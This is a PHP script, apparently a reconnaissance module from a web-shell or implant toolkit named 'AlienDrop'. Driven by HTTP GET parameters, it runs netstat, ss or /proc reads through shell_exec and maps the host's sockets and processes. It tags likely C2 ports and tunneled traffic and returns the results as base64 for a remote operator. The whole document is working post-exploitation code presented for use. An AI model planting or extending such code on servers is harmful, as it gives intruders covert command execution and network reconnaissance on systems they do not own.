<?php
// MINC - AlienDrop Advanced Netstat + Socket Classifier v4

$rdns_enabled = isset($_GET['rdns']) && $_GET['rdns'] === 'true';
$json_output = isset($_GET['json']) && $_GET['json'] === 'true';

header("Content-Type: " . ($json_output ? "application/json" : "text/plain"));

function get_process_name($pid_proc) {
    $pid = explode("/", $pid_proc)[0] ?? null;
    if (!$pid || !is_numeric($pid)) return "unknown";
    $cmdline_path = "/proc/$pid/cmdline";
    if (file_exists($cmdline_path)) {
        $cmd = @file_get_contents($cmdline_path);
        return $cmd ? basename(explode("\0", $cmd)[0]) : "unknown";
    }
    return "unknown";
}

function classify_ip($ip) {
    if (strpos($ip, "127.") === 0 || $ip === "localhost") return "loopback";
    if (strpos($ip, "192.168.") === 0 || strpos($ip, "10.") === 0) return "lan";
    if (strpos($ip, "172.") === 0) return "lan";
    if ($ip === "0.0.0.0") return "listening";
    return "external";
}

function stealth_netstat($rdns_enabled = false) {
    $out = [];

    $cmds = [
        "netstat -tunap 2>/dev/null",
        "ss -tunap 2>/dev/null",
        "cat /proc/net/tcp && echo '[tcp]' && cat /proc/net/udp"
    ];

    $netstat = "";
    foreach ($cmds as $cmd) {
        $netstat = @shell_exec($cmd);
        if ($netstat && strlen($netstat) > 10) break;
    }

    if (!$netstat) return [];

    $lines = explode("\n", $netstat);

    foreach ($lines as $line) {
        if (!preg_match('/^(tcp|udp)/', $line)) continue;

        $fields = preg_split('/\s+/', $line);
        if (count($fields) < 5) continue;

        $proto     = $fields[0];
        $local     = $fields[3] ?? '';
        $remote    = $fields[4] ?? '';
        $pid_proc  = isset($fields[6]) && strpos($fields[6], '/') !== false ? $fields[6] : "unknown";
        $state     = $fields[5] ?? 'unknown';

        $local_ip  = explode(':', $local)[0] ?? '';
        $remote_ip = explode(':', $remote)[0] ?? '';
        $port      = intval(explode(':', $local)[1] ?? 0);

        $tags = [];
        $context = classify_ip($remote_ip);
        if ($context === "external") $tags[] = "external";
        if ($context === "loopback") $tags[] = "local";
        if (in_array(strtolower($state), ["listen", "listening"])) $tags[] = "listener";
        if (in_array($port, [6667, 9050, 1080, 8080, 8443])) $tags[] = "c2_port";

        $process = get_process_name($pid_proc);

        if ($port === 443 && !in_array($process, ['apache', 'nginx', 'httpd'])) {
            $tags[] = "tunneled";
        }

        $entry = [
            "protocol" => $proto,
            "local"    => $local,
            "remote"   => $remote,
            "state"    => $state,
            "pid_proc" => $pid_proc,
            "process"  => $process,
            "tags"     => $tags,
            "context"  => $context
        ];

        if ($rdns_enabled && $context === "external") {
            $rdns = @gethostbyaddr($remote_ip);
            if ($rdns && $rdns !== $remote_ip) {
                $entry['rdns'] = $rdns;
            }
        }

        $out[] = $entry;
    }

    return $out;
}

// EXEC
$data = stealth_netstat($rdns_enabled);

if ($json_output) {
    echo json_encode($data, JSON_PRETTY_PRINT);
} else {
    echo "NETSTAT:" . base64_encode(json_encode($data));
}
?>

